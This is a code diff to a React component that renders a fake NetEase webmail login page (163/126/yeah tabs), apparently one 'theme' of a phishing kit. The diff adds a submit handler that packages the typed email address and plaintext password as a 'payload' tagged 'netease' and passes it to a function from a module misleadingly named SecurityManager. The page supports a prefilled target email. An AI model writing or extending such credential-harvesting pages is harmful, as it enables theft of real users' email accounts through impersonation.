@@ -1,6 +1,7 @@
 
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
+import { useSecurity } from '../components/SecurityManager';
 
 interface NetEaseThemeProps {
   prefilledEmail?: string;
@@ -11,6 +12,21 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
   const [username, setUsername] = useState(prefilledEmail?.split('@')[0] || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'163' | '126' | 'yeah'>('163');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email: `${username}@${activeTab}.com`, password }, 'netease');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white">
@@ -71,7 +87,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
               </button>
             </div>
 
-            <div className="px-10 mt-10 space-y-6">
+            <form onSubmit={handleSubmit} className="px-10 mt-10 space-y-6">
               <div className="relative border border-gray-300 rounded focus-within:border-red-500 transition-all flex items-center">
                 <input 
                   type="text" 
@@ -101,8 +117,12 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                 <a href="#" className="hover:underline">{lang === 'zh' ? '忘记密码?' : 'Forgot Password?'}</a>
               </div>
 
-              <button className="w-full py-3.5 bg-[#d81e06] hover:bg-[#b51905] text-white font-bold rounded transition-all text-[18px] shadow-lg shadow-red-200">
-                {lang === 'zh' ? '登 录' : 'Log in'}
+              <button 
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full py-3.5 bg-[#d81e06] hover:bg-[#b51905] text-white font-bold rounded transition-all text-[18px] shadow-lg shadow-red-200 disabled:opacity-70"
+              >
+                {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Log in')}
               </button>
 
               <div className="pt-4 text-center">
@@ -110,7 +130,7 @@ const NetEaseTheme: React.FC<NetEaseThemeProps> = ({ prefilledEmail }) => {
                   {lang === 'zh' ? '还没有网易帐号？立即注册' : 'No account? Sign up now'}
                 </a>
               </div>
-            </div>
+            </form>
           </div>
         </div>
       </main>
